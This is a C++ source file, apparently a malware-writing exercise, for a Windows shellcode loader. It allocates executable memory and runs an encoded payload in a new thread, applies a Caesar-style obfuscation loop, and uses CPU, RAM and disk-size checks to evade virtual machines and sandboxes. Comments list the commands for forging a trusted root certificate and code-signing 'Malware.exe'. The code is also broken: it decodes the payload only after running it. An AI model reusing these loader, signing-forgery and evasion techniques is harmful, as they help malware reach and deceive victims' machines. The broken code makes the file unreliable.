#include <Windows.h>
#include <bits/stdc++.h>
#include <winioctl.h>



using namespace std;
int main()
{
    
    //this condition removes dependecy on the library (kernel32.lib) that can be called a malicious activity
    
    const char shellcode[] = "\x79\x80\x73\x83\x72\x7c\x7d\x7b\x2d\x3b\x7d\x2d\x84\x76\x7e\x71\x7d\x77 \x82\x3c\x82\x75\x72\x7a\x7a\x6c\x6f\x76\x7c\x73\x6c\x81\x70\x7d\x2d\x59\x5d\x5c\x5f\x61\x4b\x41\x41\x41\x41\x2d\x2d\x73\x2d\x70";
    PVOID shellcode_exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //this allocates a virtual memory onto the windows os stack so that we can place our shellcode there
    RtlCopyMemory(shellcode_exec, shellcode, sizeof(shellcode));
    //this places the shellcode at the location
    DWORD threadID;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
    //this creates a thread to eecute the shellcode
    WaitForSingleObject(hThread, INFINITE);
    //this makes sure that the shellcode finishes executing 

//OBFUSCATION TECHNIQUES
    for (int i = 0; i < sizeof shellcode; i++)
	{
		((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) - 13;   //simply applying caesar cipher to generate the right code
        // std::cout<<(shellcode_exec);
	}
    

//CREATING FAKE CERTIFICATES
    //makecert -r -pe -n "CN=Malwr CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MalwrCA.pvk MalwrCA.cer
    //certutil -user -addstore Root MalwrCA.cer
    //makecert -pe -n "CN=Malwr Cert" -a sha256 -cy end -sky signature -ic MalwrCA.cer -iv MalwrCA.pvk -sv MalwrCert.pvk MalwrCert.cer
    //pvk2pfx -pvk MalwrCert.pvk -spc MalwrCert.cer -pfx MalwrCert.pfx
    //signtool sign /v /f MalwrCert.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll Malware.exe


//VM DETECTION
//BASICALLY A VM HAS A VERY LIMITED ENVIRONMENT AND THUS IT CAN BE DETECTED USING THESE BELOW TECHNIQUES


// check CPU
SYSTEM_INFO systemInfo;
GetSystemInfo(&systemInfo);
DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
if (numberOfProcessors < 2) return false;

//IF THE NUMBER OF CORES IS LESS THAN 2 THEN IT STOPS ITS EXECUTION

// check RAM
MEMORYSTATUSEX memoryStatus;
memoryStatus.dwLength = sizeof(memoryStatus);
GlobalMemoryStatusEx(&memoryStatus);
DWORD RAMMB = static_cast<DWORD>(memoryStatus.ullTotalPhys / (1024 * 1024));
    if (RAMMB < 2048){return false;} 

//IF THE RAM IS LESS THAN 2048 THEN IT IS DETECTED AND THE ACTIVITY WILL STOP IT EXECUTION

// check HDD
HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
DISK_GEOMETRY pDiskGeometry;
DWORD bytesReturned;
DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
DWORD diskSizeGB;
diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
if (diskSizeGB < 100) return false;

//IF HARD DISK HAS LESSER MEMORY THAN 100 GB THEN IT WILL NOT EXECUTE



    return 0;
}




